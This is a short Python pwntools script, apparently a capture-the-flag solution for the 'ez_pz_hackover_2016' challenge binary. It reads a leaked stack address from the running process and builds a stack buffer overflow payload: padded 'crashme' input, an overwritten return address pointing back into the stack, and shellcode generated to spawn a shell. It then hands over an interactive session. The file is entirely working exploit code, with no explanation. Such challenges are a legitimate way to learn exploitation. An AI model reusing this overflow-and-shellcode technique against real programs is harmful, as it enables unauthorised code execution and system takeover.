# coding:utf-8

from pwn import *

context.log_level = 'debug'

p = process('./ez_pz_hackover_2016')
elf = ELF('./ez_pz_hackover_2016')

p.recvuntil('crash: ')
stack_addr = int(p.recv(10), 16)
p.recvuntil('> ')
payload = 'crashme\x00'.ljust(26, '\x00')
payload += p32(stack_addr - 0x1C)
payload += asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
